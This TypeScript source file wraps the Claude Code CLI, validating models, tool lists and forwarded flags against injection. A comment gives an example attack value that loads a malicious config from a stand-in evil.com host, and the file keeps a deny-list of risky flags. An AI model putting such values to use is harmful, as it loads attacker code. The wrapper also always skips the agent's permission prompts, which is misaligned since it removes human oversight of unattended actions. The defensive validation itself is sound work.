import { spawn } from 'child_process';
import chalk from 'chalk';
import ora from 'ora';
import { CodingAgent, GenerationResult, InvokeOptions } from '../types';
import { Result, Ok, Err } from '../utils/result';
import { ValidationError } from '../types/errors';
import { stripLineNumbers, cleanErrorMessage } from '../utils/output-formatting';

/**
 * Security: Whitelisted allowed models to prevent command injection
 */
const ALLOWED_MODELS = [
  'claude-sonnet-4',
  'claude-sonnet-4-5',
  'claude-sonnet-4-5-20250929',
  'claude-opus-4',
  'claude-haiku-4',
  'sonnet',
  'opus',
  'haiku',
];

/**
 * Security: Validate tool name format to prevent injection
 * Tool names must be alphanumeric with underscores, optionally prefixed with mcp__
 */
const TOOL_NAME_REGEX = /^(mcp__)?[a-zA-Z][a-zA-Z0-9_]*$/;

/**
 * Security: Validate that a string doesn't contain shell metacharacters
 */
function isValidToolList(tools: string): boolean {
  // Tool lists should be comma-separated tool names, possibly with args in parentheses
  // Format: "Tool1,Tool2(arg1:pattern),Tool3"
  // We need to ensure no shell metacharacters like ; | & $ ` \ etc.

  // Split by comma and validate each tool
  const toolParts = tools.split(',').map(t => t.trim());

  for (const tool of toolParts) {
    // Extract tool name (before any parenthesis)
    const toolName = tool.split('(')[0].trim();

    // Validate tool name format
    if (!TOOL_NAME_REGEX.test(toolName)) {
      return false;
    }

    // If there are arguments, validate they don't contain dangerous characters
    if (tool.includes('(')) {
      // Check for shell metacharacters
      if (/[;&|`$\\<>]/.test(tool)) {
        return false;
      }
    }
  }

  return true;
}

/**
 * Security: Validate model name
 */
function validateModel(model: string): Result<string, ValidationError> {
  if (!ALLOWED_MODELS.includes(model)) {
    return new Err(
      new ValidationError(
        `Invalid model: "${model}". Allowed models: ${ALLOWED_MODELS.join(', ')}`,
        'INVALID_MODEL',
        { model, allowedModels: ALLOWED_MODELS }
      )
    );
  }
  return new Ok(model);
}

/**
 * Security: Validate tool list
 */
function validateToolList(tools: string): Result<string, ValidationError> {
  if (!isValidToolList(tools)) {
    return new Err(
      new ValidationError(
        `Invalid tool list: "${tools}". Tool names must be alphanumeric with underscores.`,
        'INVALID_CONFIG',
        { tools }
      )
    );
  }
  return new Ok(tools);
}

/**
 * Security: Sanitize system prompt to prevent injection attacks
 */
function sanitizeSystemPrompt(prompt: string): string {
  // Remove any null bytes or control characters that could cause issues
  return prompt.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
}

/**
 * Security: Flags that cannot be forwarded due to security risks (CWE-88: Argument Injection)
 *
 * These flags can load external code, access sensitive directories, or modify agent behavior.
 * Users should configure these settings using agentConfig in their code instead.
 *
 * Rationale:
 * - We use spawn() with array args (not exec), which prevents shell injection (CWE-78)
 * - But malicious FLAG VALUES can still be processed by Claude Code CLI
 * - Example: --mcp-config=https://evil.com/malicious.json loads external code
 *
 * Defense Strategy: Blacklist dangerous flags + validate flag structure
 * - Allows future Claude Code flags to work automatically
 * - Only blocks specific high-risk flags
 * - Clear error messages guide users to safe alternatives
 */
const DANGEROUS_FORWARDED_FLAGS = new Set([
  'mcp-config',         // Load external MCP servers (RCE risk)
  'add-dir',            // Grant access to arbitrary directories
  'settings',           // Load external settings (RCE risk)
  'plugin-dir',         // Load external plugins (RCE risk)
  'system-prompt',      // Use agentConfig.appendSystemPrompt instead
  'session-id',         // Session management should be internal
  'agents',             // Agent definitions should be in config
]);

/**
 * Security: Validate flag name format
 * Flag names must be alphanumeric with hyphens and underscores
 */
const FLAG_NAME_REGEX = /^[a-zA-Z][a-zA-Z0-9_-]*$/;

/**
 * Security: Dangerous characters in flag values
 * Block shell metacharacters that could be used for injection attacks
 */
const DANGEROUS_VALUE_CHARS = /[;&|`$\\<>(){}[\]!*?]/;

/**
 * Security: Validate flag structure to prevent injection
 *
 * Validates that a flag follows expected format and doesn't contain dangerous patterns.
 * This is Layer 1 of defense (syntactic validation).
 *
 * @param flag - The flag to validate (e.g., "--model=sonnet" or "--debug")
 * @returns Result with validated flag or validation error
 */
function validateFlagStructure(flag: string): Result<string, ValidationError> {
  // Must start with - or --
  if (!flag.startsWith('-')) {
    return new Err(
      new ValidationError(
        `Flag must start with - or --: "${flag}"`,
        'INVALID_FLAG_FORMAT',
        { flag }
      )
    );
  }

  // Split into name and value (handle both --flag and --flag=value)
  const parts = flag.replace(/^-+/, '').split('=', 2);
  const flagName = parts[0];
  const flagValue = parts[1];

  // Validate flag name format (alphanumeric with hyphens/underscores)
  if (!FLAG_NAME_REGEX.test(flagName)) {
    return new Err(
      new ValidationError(
        `Invalid flag name: "${flagName}". Must be alphanumeric with hyphens/underscores.`,
        'INVALID_FLAG_NAME',
        { flag: flagName }
      )
    );
  }

  // If flag has a value (--flag=value), validate it doesn't contain dangerous characters
  if (flagValue !== undefined && DANGEROUS_VALUE_CHARS.test(flagValue)) {
    return new Err(
      new ValidationError(
        `Flag value contains dangerous characters: "${flagValue}". ` +
        `Shell metacharacters (;&|` + '`$\\<>(){}[]!*?) are not allowed.',
        'INVALID_FLAG_VALUE',
        { flag: flagName, value: flagValue }
      )
    );
  }

  return new Ok(flag);
}

/**
 * Security: Check if flag is blacklisted
 *
 * Blocks specific high-risk flags that can load external code or access sensitive resources.
 * This is Layer 2 of defense (semantic validation).
 *
 * @param flag - The flag to check (e.g., "--model=sonnet")
 * @returns Result with flag or validation error if blacklisted
 */
function checkFlagBlacklist(flag: string): Result<string, ValidationError> {
  // Extract flag name (handle both --flag and --flag=value)
  const flagName = flag.replace(/^-+/, '').split('=')[0];

  if (DANGEROUS_FORWARDED_FLAGS.has(flagName)) {
    return new Err(
      new ValidationError(
        `Flag --${flagName} cannot be forwarded for security reasons. ` +
        `Configure this setting using agentConfig in your code instead. ` +
        `See documentation for agent configuration options.`,
        'DANGEROUS_FLAG',
        {
          flag: flagName,
          suggestion: `Use agentConfig in your .ai file instead of --${flagName}`
        }
      )
    );
  }

  return new Ok(flag);
}

/**
 * Security: Validate all forwarded flags
 *
 * Applies two layers of validation:
 * 1. Structure validation: Ensures flags follow expected format
 * 2. Blacklist check: Blocks specific dangerous flags
 *
 * @param flags - Array of flags to validate
 * @returns Result with validated flags array or first validation error
 */
function validateForwardedFlags(flags: string[]): Result<string[], ValidationError> {
  const validated: string[] = [];

  for (const flag of flags) {
    // Layer 1: Validate flag structure (syntactic security)
    const structureResult = validateFlagStructure(flag);
    if (structureResult.ok === false) {
      return new Err(structureResult.error);
    }

    // Layer 2: Check blacklist (semantic security)
    const blacklistResult = checkFlagBlacklist(flag);
    if (blacklistResult.ok === false) {
      return new Err(blacklistResult.error);
    }

    validated.push(flag);
  }

  return new Ok(validated);
}

/**
 * Build command-line arguments for Claude Code CLI
 *
 * Pure function extracted for testability. Handles:
 * - Base arguments (prompt, output format, permissions)
 * - Agent configuration (model, tools, system prompt)
 * - Flag forwarding with security validation
 *
 * @param prompt - The prompt to pass to Claude Code
 * @param options - Invocation options including config and forwarded flags
 * @returns Array of command-line arguments for spawn()
 * @throws Error if validation fails for model, tools, or forwarded flags
 */
export function buildClaudeArguments(
  prompt: string,
  options: InvokeOptions
): string[] {
  const args = [
    '-p', // Print mode (headless, already non-interactive)
    prompt,
    '--output-format', 'stream-json', // Stream output in real-time
    '--verbose', // Required for stream-json with --print
    '--dangerously-skip-permissions', // Skip all permission prompts for fully unattended execution
  ];

  // Add agent-specific configuration with security validation
  if (options.agentConfig) {
    const config = options.agentConfig as Record<string, unknown>;

    // Security: Validate model name against whitelist
    if (config.model) {
      const modelResult = validateModel(String(config.model));
      if (modelResult.ok === false) {
        throw new Error(modelResult.error.message);
      }
      args.push('--model', modelResult.value);
    }

    // Security: Validate tool list format
    if (config.allowedTools) {
      const toolsResult = validateToolList(String(config.allowedTools));
      if (toolsResult.ok === false) {
        throw new Error(toolsResult.error.message);
      }
      args.push('--allowedTools', toolsResult.value);
    }

    // Security: Validate tool list format
    if (config.disallowedTools) {
      const toolsResult = validateToolList(String(config.disallowedTools));
      if (toolsResult.ok === false) {
        throw new Error(toolsResult.error.message);
      }
      args.push('--disallowedTools', toolsResult.value);
    }

    // Security: Sanitize system prompt
    if (config.appendSystemPrompt) {
      const sanitizedPrompt = sanitizeSystemPrompt(String(config.appendSystemPrompt));
      args.push('--append-system-prompt', sanitizedPrompt);
    }

    // Security: Validate fallback model name against whitelist
    if (config.fallbackModel) {
      const modelResult = validateModel(String(config.fallbackModel));
      if (modelResult.ok === false) {
        throw new Error(modelResult.error.message);
      }
      args.push('--fallback-model', modelResult.value);
    }
  }

  // Security: Validate and forward unknown flags to Claude Code CLI
  // These flags were passed to dot.ai but not recognized by our CLI parser
  // This allows future-proofing as Claude Code adds new flags
  // Defense: Two-layer validation (structure + blacklist) prevents argument injection (CWE-88)
  if (options.forwardedFlags && options.forwardedFlags.length > 0) {
    const validationResult = validateForwardedFlags(options.forwardedFlags);
    if (validationResult.ok === false) {
      throw new Error(validationResult.error.message);
    }
    args.push(...validationResult.value);
  }

  return args;
}

/**
 * Tool information for buffered display
 */
interface ToolInfo {
  name: string;
  displayText: string;
  result?: string;
  isError?: boolean;
  completed: boolean;
}

/**
 * Claude Code agent implementation
 */
export class ClaudeCodeAgent implements CodingAgent {
  name = 'claude-code';

  async invoke(prompt: string, options: InvokeOptions): Promise<GenerationResult> {
    try {
      const output = await this.runClaudeCode(prompt, options);
      const artifacts = this.parseOutput(output);

      return {
        success: true,
        artifacts,
        rawOutput: output,
      };
    } catch (error) {
      return {
        success: false,
        artifacts: [],
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  parseOutput(rawOutput: string): string[] {
    try {
      const artifacts = new Set<string>();
      let resultText = '';

      // Parse stream-json output (newline-delimited JSON)
      const lines = rawOutput.split('\n').filter((line: string) => line.trim());

      for (const line of lines) {
        try {
          const json = JSON.parse(line);

          // Get the final result text
          if (json.type === 'result' && json.result) {
            resultText = json.result;
          }
        } catch {
          // Skip invalid JSON lines
          continue;
        }
      }

      // Extract file paths from the result text
      if (resultText) {
        // Match patterns like: "Created file.ts", "file.ts created", "/path/to/file.ts"
        const filePattern = /(?:^|\s|`)([A-Za-z0-9_.-]+\.(ts|tsx|js|jsx|py|rs|go|java|cpp|c|h|css|scss|html|json|yaml|yml|md|txt|sh))(?:$|\s|`)/g;
        const matches = resultText.matchAll(filePattern);
        for (const match of matches) {
          artifacts.add(match[1]);
        }

        // Also try to extract absolute paths
        const absolutePathPattern = /`([^`]+\.(ts|tsx|js|jsx|py|rs|go|java|cpp|c|h|css|scss|html|json|yaml|yml|md|txt|sh))`/g;
        const absoluteMatches = resultText.matchAll(absolutePathPattern);
        for (const match of absoluteMatches) {
          // Extract just the filename from absolute paths
          const filename = match[1].split('/').pop();
          if (filename) {
            artifacts.add(filename);
          }
        }
      }

      return Array.from(artifacts);
    } catch {
      // If parsing fails, return empty array
      return [];
    }
  }

  /**
   * Build display text for a tool invocation
   * Extracted for better readability and maintainability
   */
  private buildToolDisplayText(toolName: string, input: Record<string, unknown>): string {
    if (toolName === 'Read' && input.file_path) {
      return chalk.bold('Read') + ` ${input.file_path}\n`;
    } else if (toolName === 'Write' && input.file_path) {
      return chalk.bold('Write') + ` ${input.file_path}\n`;
    } else if (toolName === 'Edit' && input.file_path) {
      return chalk.bold('Edit') + ` ${input.file_path}\n`;
    } else if (toolName === 'Bash' && input.command) {
      return chalk.bold('Bash') + ` ${input.command}\n`;
    } else if (toolName === 'Glob' && input.pattern) {
      return chalk.bold('Glob') + ` ${input.pattern}\n`;
    } else if (toolName === 'Grep' && input.pattern) {
      return chalk.bold('Grep') + ` ${input.pattern}\n`;
    } else {
      return chalk.bold(toolName) + '\n';
    }
  }

  /**
   * Format tool result for display
   * Strips line numbers and truncates to first 5 lines
   */
  private formatToolResult(toolResult: string): string {
    const cleanedResult = stripLineNumbers(toolResult);
    const lines = cleanedResult.split('\n');
    const firstFiveLines = lines.slice(0, 5).join('\n');
    return lines.length > 5 ? firstFiveLines + '\n...' : firstFiveLines;
  }

  /**
   * Build command-line arguments for claude command
   * Delegates to buildClaudeArguments pure function for better testability
   */
  private buildArguments(prompt: string, options: InvokeOptions): string[] {
    return buildClaudeArguments(prompt, options);
  }

  private async runClaudeCode(prompt: string, options: InvokeOptions): Promise<string> {
    return new Promise((resolve, reject) => {
      const args = this.buildArguments(prompt, options);

      const proc = spawn('claude', args, {
        cwd: options.cwd,
        stdio: ['ignore', 'pipe', 'pipe'],
      });

      let stdout = '';
      let stderr = '';
      let lastResult = '';

      // Buffering system for ordered tool display
      const toolQueue: string[] = []; // Order of tool IDs
      const toolBuffer = new Map<string, ToolInfo>(); // tool_id → tool info

      // Start spinner at bottom of output
      const spinner = ora({
        text: '',
        color: 'cyan',
        indent: 0,
      }).start();

      // Display next completed tool in queue
      const displayNextTool = () => {
        while (toolQueue.length > 0) {
          const nextToolId = toolQueue[0];
          const toolInfo = toolBuffer.get(nextToolId);

          if (toolInfo && toolInfo.completed) {
            // Display tool and result together
            process.stdout.write(toolInfo.displayText);
            if (toolInfo.result) {
              if (toolInfo.isError) {
                const cleanError = cleanErrorMessage(toolInfo.result);
                process.stdout.write(chalk.red(`✗ ${cleanError}`) + '\n\n');
              } else {
                process.stdout.write(chalk.gray(`↳ `) + chalk.gray(toolInfo.result) + '\n\n');
              }
            } else {
              process.stdout.write('\n');
            }

            // Remove from queue and buffer
            toolQueue.shift();
            toolBuffer.delete(nextToolId);
          } else {
            // Next tool not ready yet, stop
            break;
          }
        }
      };

      // Stream stdout to console while capturing
      proc.stdout.on('data', (data) => {
        const chunk = data.toString();
        stdout += chunk;

        // Parse stream-json chunks for readable display
        const lines = chunk.split('\n').filter((line: string) => line.trim());
        for (const line of lines) {
          try {
            const json = JSON.parse(line);

            if (json.type === 'init') {
              // Session initialized
              process.stdout.write(`\n`);
            } else if (json.type === 'assistant' && json.message?.content) {
              // Assistant message chunk - display readable content
              for (const content of json.message.content) {
                if (content.type === 'text' && content.text) {
                  // Display text content immediately (not tool-related)
                  process.stdout.write(`${content.text}\n\n`);
                } else if (content.type === 'tool_use') {
                  // Buffer tool use - don't display yet
                  const toolName = content.name;
                  const toolId = content.id;
                  const input = content.input || {};

                  if (toolId) {
                    // Build display text for this tool
                    const displayText = this.buildToolDisplayText(toolName, input);

                    // Add to buffer and queue
                    toolQueue.push(toolId);
                    toolBuffer.set(toolId, {
                      name: toolName,
                      displayText,
                      completed: false,
                    });
                  }
                }
              }
            } else if (json.type === 'user' && json.message?.content) {
              // User messages containing tool results
              for (const content of json.message.content) {
                if (content.type === 'text' && content.text) {
                  process.stdout.write(chalk.cyan('User: ') + content.text + '\n\n');
                } else if (content.type === 'tool_result') {
                  // Mark tool as completed with result
                  const toolResult = content.content;
                  const toolUseId = content.tool_use_id;
                  const isError = content.is_error;

                  if (toolUseId && toolBuffer.has(toolUseId)) {
                    const toolInfo = toolBuffer.get(toolUseId)!;

                    if (toolResult && typeof toolResult === 'string' && toolResult.trim()) {
                      // Format and truncate tool output
                      toolInfo.result = this.formatToolResult(toolResult);
                      toolInfo.isError = isError;
                    }

                    toolInfo.completed = true;

                    // Try to display completed tools in order
                    displayNextTool();
                  }
                }
              }
            } else if (json.type === 'result') {
              // Final result
              lastResult = json.result || '';
              if (json.is_error) {
                process.stderr.write(`\nError: ${lastResult}\n`);
              }
            }
          } catch {
            // Not valid JSON, might be partial chunk
          }
        }
      });

      // Stream stderr to console while capturing
      proc.stderr.on('data', (data) => {
        const chunk = data.toString();
        stderr += chunk;
        // Stream to console in real-time
        process.stderr.write(chunk);
      });

      proc.on('close', (code) => {
        spinner.stop();
        if (code === 0) {
          resolve(stdout);
        } else {
          reject(new Error(`Claude Code exited with code ${code}\n${stderr}`));
        }
      });

      proc.on('error', (error) => {
        spinner.stop();
        reject(new Error(`Failed to spawn claude: ${error.message}`));
      });
    });
  }
}
